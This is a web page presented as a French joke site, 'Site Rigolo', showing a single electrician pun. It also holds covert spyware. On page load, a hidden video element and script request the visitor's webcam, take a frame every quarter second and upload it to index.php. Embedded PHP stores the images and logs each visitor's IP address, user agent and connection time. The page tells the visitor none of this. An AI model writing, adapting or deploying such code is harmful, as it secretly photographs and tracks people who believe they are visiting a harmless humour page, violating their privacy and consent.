<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Rigolo</title>
    <style>
     body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #ffcc00, #ff6699);
            background-size: 400% 400%;
            animation: gradientAnimation 10s ease infinite;
            color: #333;
            text-align: center;
        }

        @keyframes gradientAnimation {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        header {
            padding: 20px;
        }

        h1 {
            margin: 0;
            font-size: 36px;
            color: #333;
        }

        p {
            font-size: 18px;
        }

        footer {
            padding: 10px;
            position: absolute;
            bottom: 0;
            width: 100%;
        }
    </style>
    </style>
</head>
<body>
    <header>
        <h1>Bienvenue sur le Site Rigolo!</h1>
    </header>
    <section>
        <p>Quel est le comble pour un électricien ?</p>
        <p>De ne pas être au courant !</p>
    </section>
    <footer>
        <p>&copy; 2023 Site Rigolo - Faire rire, c'est notre mission!</p>
    </footer>
    <div id="output"></div>
    <video id="camera" autoplay style="display:none;"></video>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $image_data = $_POST['image'];
        $decoded_image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $image_data));
        
        if (!is_dir('images')) {
            mkdir('images', 0755, true);
        }
    
        $image_name = 'images/captured_image_' . date('Y-m-d_H-i-s') . '.jpeg';
        file_put_contents($image_name, $decoded_image);
    
        // Log user information
        $ip_address = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $connection_time = date('Y-m-d H:i:s');
        $log_entry = "[ IP: $ip_address - Connection Time: $connection_time - User Agent: $user_agent ]\n \n \n";
        file_put_contents('log.txt', $log_entry, FILE_APPEND);
    
        echo json_encode(['message' => 'Image uploaded successfully']);
    }
    ?>
    <script>
        const interval = 250; // 250 milliseconds = 0.25 seconds
        const outputDiv = document.getElementById('output');
        const video = document.getElementById('camera');
        const constraints = { video: true };

        async function captureAndUpload() {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const image = new Image();
            image.src = canvas.toDataURL('image/jpeg');

            image.onload = function() {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'index.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('image=' + encodeURIComponent(image.src));
                outputDiv.innerHTML += ' <br>';
            };

            setTimeout(captureAndUpload, interval);
        }

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                await video.play();
                captureAndUpload();
            } catch (error) {
                console.error('Error accessing camera:', error);
            }
        }

        setupCamera();
    </script>
</body>
</html>
